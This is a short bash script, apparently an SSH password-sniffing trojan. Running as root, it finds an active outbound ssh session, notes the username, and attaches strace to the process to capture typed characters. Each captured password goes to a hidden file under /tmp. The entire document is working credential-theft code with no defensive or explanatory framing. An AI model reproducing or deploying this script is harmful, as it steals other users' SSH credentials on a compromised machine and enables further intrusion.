#!/bin/bash

file_log="/tmp/.log_sshtrojan2.txt"

if [[ $EUID -ne 0 ]]; then
  echo "You need root privileges to run this program"
  exit 1
fi

if [[ -e $file_log  ]]; then
  echo "File $file_log was created"
else
  touch $file_log
fi

username=""
password=""

# shellcheck disable=SC2046
# shellcheck disable=SC2006
echo "Time: " `date` >> $file_log

# shellcheck disable=SC2009
pid=$(ps ax | grep -w ssh | grep @  | head -n1 | awk '{ print $1}')

# shellcheck disable=SC2009
username=$(ps ax | grep ssh | grep @ |head -n1 | awk ' {print $6} ' | cut -d'@' -f1)
echo "Username: " "$username" >> $file_log


strace -f -p $pid -e trace=read --status=successful 2>&1 | while read -r line; do
	if [[ $line == *'read(4, "'* && $line == *' = 1' ]]; then
		char=$(echo "$line" | cut -d'"' -f2 | cut -d'"' -f1)
		if [[ $char == "\\n" || $char == "\\r" ]]; then
			if [[ -n "$password" ]]; then
				echo "Password: " "$password" >> $file_log
				password=""
			fi
		elif [[ $char =~ ^.{1}$ ]];then
			# shellcheck disable=SC2116
			password=$(echo "$password""$char")

		fi
	fi
done;
